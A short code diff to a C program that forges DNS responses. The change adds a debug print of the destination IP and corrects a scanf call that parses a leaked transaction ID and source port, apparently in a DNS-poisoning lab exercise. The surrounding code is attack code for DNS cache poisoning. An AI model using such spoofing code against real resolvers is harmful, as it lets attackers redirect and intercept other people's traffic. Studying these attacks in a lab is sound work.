@@ -100,6 +100,7 @@ void send_spoofed_dns_response(const char *hostname, uint32_t txid, const char *
     int response_len = build_dns_response(buffer, query, query_len, txid);
     printf("response_len: %d\n", response_len);
     printf("query: %s\n", query);
+    printf("destination_ip: %s\n", destination_ip);
     // Step 5: Send the spoofed DNS response
     if (sendto(sockfd, buffer, response_len, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
         perror("Failed to send spoofed DNS response");
@@ -209,7 +210,7 @@ void run_attack(uint32_t *txid_ls) {
     printf("Received from server: %s\n", txid_buffer);
 
     // Parse the txid
-    if (snscanf(txid_buffer, "TXID: %u, Source Port: %u", &txid, &source_port) != 2) {
+    if (sscanf(txid_buffer, "TXID: %u, Source Port: %u", &txid, &source_port) != 2) {
         fprintf(stderr, "Failed to parse TXID from server response\n");
         close(sockfd);
         exit(EXIT_FAILURE);
